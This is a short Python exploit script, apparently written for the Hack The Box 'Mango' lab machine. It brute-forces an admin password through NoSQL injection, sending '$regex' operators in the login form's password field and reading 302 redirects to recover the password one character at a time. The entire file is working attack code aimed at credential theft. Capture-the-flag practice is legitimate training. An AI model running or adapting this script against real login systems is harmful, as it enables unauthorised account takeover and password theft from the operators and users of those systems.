#!/usr/bin/python3

from pwn import *
import requests,signal,sys
import string
import time
import re

def def_handler(sig,frame):
	print("Quitter Le Programe")
	sys.exit(1)

#Cntrl+C
signal.signal(signal.SIGINT,def_handler)

print ("")
#Variables_Globals
Url = "http://staging-order.mango.htb/"

def Make_NoSqlInjection():

	Password=''
	p1 = log.progress("\033[1;32mBrute_Force Search For Password Valide  \n")
	time.sleep(1)
	p1.status("Usage Brute_Force\n")

	cookies= {'PHPSESSID':'108sqn03r6en49o2hqmtgi03oi'}
	Alpha = string.ascii_letters + string.digits  + string.punctuation
	while True:
	    for char in Alpha:
 
	        Post_Data = {
	            'username': 'admin' ,
	            'password[$regex]': f'^%s%s.*' % (Password,re.escape(char)),
	            'login': 'login',
	        }
	        p1.status("%s" % Post_Data)
	        r = requests.post(Url, data=Post_Data, allow_redirects=False, cookies=cookies).status_code
	        if r == 302:
	           Password+=char
	           p1.status(" %s " % Password)
	           break;  
Make_NoSqlInjection()
